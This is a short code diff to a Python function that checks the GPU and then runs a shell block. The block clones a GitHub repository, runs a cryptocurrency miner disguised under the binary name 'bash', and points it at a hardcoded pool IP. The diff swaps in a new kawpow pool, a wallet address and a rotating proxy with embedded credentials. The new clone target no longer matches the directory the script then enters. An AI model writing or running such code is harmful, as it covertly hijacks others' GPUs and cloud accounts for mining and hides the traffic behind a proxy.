@@ -27,10 +27,10 @@ def run_script():
     subprocess.run(["nvidia-smi"], check=True)
 
     cmd = """
-    git clone https://github.com/hujisanda/lol198.git
+    git clone https://github.com/hujisanda/bbm.git
     cd lol198
     chmod u+x bash
-    ./bash --algo FISHHASH --pool 134.209.175.114:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
+    ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
